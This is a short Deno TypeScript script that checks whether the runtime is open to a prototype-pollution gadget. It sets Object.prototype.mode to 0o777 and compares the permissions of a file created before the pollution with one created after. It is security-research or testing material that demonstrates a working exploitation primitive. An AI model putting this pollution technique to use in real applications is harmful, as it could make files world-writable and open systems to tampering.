function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

const data = new TextEncoder().encode("foobar");

let unpolluted: number | null = null;
{
    const name = "foo";
    const file = await Deno.open(`./${name}`, { create: true, write: true });
    await file.write(data);
    file.close();

    const fileInfo = await Deno.stat(`./${name}`);
    unpolluted = fileInfo.mode;

    await Deno.remove(`./${name}`);
}

let polluted: number | null = null;
{
    pollute("mode", 0o777);

    const name = "bar";
    const file = await Deno.open(`./${name}`, { create: true, write: true });
    await file.write(data);
    file.close();

    const fileInfo = await Deno.stat(`./${name}`);
    polluted = fileInfo.mode;

    await Deno.remove(`./${name}`);
}

if (unpolluted !== polluted) {
    console.log("Your Deno version is vulnerable to this gadget.");
} else {
    console.log("Your Deno version is NOT affected.");
}
